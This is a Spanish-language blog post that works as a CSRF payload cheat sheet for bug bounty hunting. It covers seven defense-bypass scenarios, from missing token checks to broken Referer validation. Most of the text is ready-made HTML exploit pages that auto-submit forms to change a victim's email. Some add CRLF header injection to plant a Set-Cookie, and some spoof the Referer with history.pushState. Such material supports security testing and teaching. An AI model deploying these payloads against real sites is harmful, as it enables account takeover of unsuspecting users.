---
layout: post
title:  "CSRF Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/159375082-f0ca6711-c380-41c8-b82d-9e1515ff729e.png
beforetoc: ""
toc: false
tags: [ Web, Bug Bounty, Payloads ]
---
Ataques CSRF (Cross-site request forgery) o falsificación de petición en sitios cruzados es un tipo de exploit malicioso que tiene como objetivo realizar operaciones no autorizadas que serán ejecutadas por un usuario del cual el sitio web confía.

# Table of Contents
1. [Vulnerabilidad CSRF sin defensas](#CSRFsinDefensas)
2. [Validación token depende método solicitud](#CSRFenGET)
3. [Validación token depende presencia token](#CSRFenPresencia)
4. [El token CSRF no está vinculado a la sesión del usuario](#CSRFnoVinculado)<br>
   4.1. [Mismo token entre usuarios](#MismoTokenUsuarios)<br>
   4.2. [Token no vinculado a la sesion](#SesionTokenNoVinculado)
5. [El token se duplica en la cookie](#TokenDuplicaCookie)
6. [CSRF sin Referrer](#CSRFsinReferrer)
7. [Validacion del Referer rota](#CSRFRefererRoto)

---

### Vulnerabilidad CSRF sin defensas <a name="CSRFsinDefensas"></a>
**CSRF basico correo**<br>
Hace una peticion a la pagina en la ruta donde se cambia el correo y con el javascript confirma la peticion, lo cual se cambiará el correo con solo visitar la pagina.

Codigo de https://web-atacante.com/malicioso.html

```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
---
### CSRF donde la validación del token depende del método de solicitud <a name="CSRFenGET"></a>
Dependiendo del metodo de peticion, se puede hacer con GET
```html
<img src="https://vulnerable-web.com/my-account/change-email?email=pwned@gmail.com"/>
```
---
### CSRF donde la validación del token depende de la presencia del token <a name="CSRFenPresencia"></a>
No verifica el token CSRF, se eliminia y se bypassea.

```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
             <input type="hidden"  value="csrf" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
---
### El token CSRF no está vinculado a la sesión del usuario <a name="CSRFnoVinculado"></a>
**Usar el mismo token en ambos usuarios**<br>
Podemos usar el mismo Token CSRF en un usuario que en otro, gracias a que el token que no esta vinculado a la sesión del usuario <a name="MismoTokenUsuarios"></a><br>
Mi token: U6vJiRteqjSX46XRk57k6saqolEcdDvQ sirve para otros usuarios tambien.
```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
                        <input type="hidden" name="csrf" value="<csrf>"  />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
**El token CSRF no esta vinvulado a la sesion.** <a name="SesionTokenNoVinculado"></a><br>
Por lo que se podria usar el mismo csrf token y la misma csrf key en una cuenta que en otra para cambiar el correo  
```html
<html>
  <body>
    <form action="https://vulnerable-web.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@gmail.com" /> 
      <input type="hidden" name="csrf" value="<csrf>" />
      <input type="submit" value="Submit request" />    </form>
  <img src="https://vulnerable-web.com/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>" onerror="document.forms[0].submit()">

  </body>
</html>
```

---

### El token CSRF simplemente se duplica en una cookie <a name="TokenDuplicaCookie"></a>
El token se valida en la cookie, podemos hacer que el usuario se cree su propio token csrf el cual indicamos nosotros.

![cookieToken](https://user-images.githubusercontent.com/47476901/159374578-694ad92d-dc4c-43c5-b169-a32c28eebf3f.png)

Como se validaba el token en la cookie podemos mandar la peticion para el cambio de correo.

```html
<html>
    <body>
        <form action="https://vulnerable-web.com/email/change" method="POST" >
            <input type="hidden" name="email" value="pwned@gmail.com">
            <input type="hidden" name="csrf" value="tokenfalso">
        </form>
		
        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=tokenfalso" onerror="document.forms[0].submit()">
    </body>
</html>
```


---
### CSRF sin Referrer <a name="CSRFsinReferrer"></a>
Indicamos que no exista el Referer en el exploit del CSRF usando el tag de meta.

```html
<html>
  <head> 
     <meta name="referrer" content="no-referrer">
  </head> 
<body> 
   <form action="https://vulnerable-web.com/email/change" method="POST"> 
   <input type="hidden" name="email" value="pwned@gmail.com" />
   <input type="submit"/>
</form> 
   <script>document.forms[0].submit();</script>
</body>
</html>
```


---
### CSRF con validacion del Referer rota <a name="CSRFRefererRoto"></a>

La pagina valida el referrer cuando queremos cambiar de correo, **se fija si el referer incluye el dominio de la pagina origen.**
Modificando el referer con javascript podemos evadir esta validacion y poder explotar el CSRF.

**Modificar el Referer:**
 - Usando esta funcion de javascript `history.pushState()` que agrega una entrada a la pila del historial de sesiones del navegador.
```html
<script>history.pushState("", "", "/?vulnerable-web.com")</script>
```
- Validacion del referer acepta cualquier encabezado que contenga el dominio esperado en algún lugar de la cadena
```html
Referer: https://atacante-web.com/?vulnerable-web.com
```

**Referrer-Policy**
- Muchos navegadores ahora eliminan la cadena de consulta del encabezado Referrer de forma predeterminada como medida de seguridad. Para anular este comportamiento y asegurarnos de que la URL completa se incluya en la solicitud.
- Tenemos que añadir en el encabezado "Referrer-Policy: unsafe-url"
```html
<meta name="referrer" content="unsafe-url" />
```

```html
<html>
   <head>
      <meta name="referrer" content="unsafe-url" />
   </head>
   <body>
      <script>
         history.pushState("", "", "/?vulnerable-web.com")
             
      </script>
      <form action="https://vulnerable-web.com/email/change" method="POST">
         <input type="hidden" name="email" value="pwned@gmail.com" />
         <input type="submit" value="Submit request" />
      </form>
      <script>document.forms[0].submit();</script>
   </body>
</html>
```
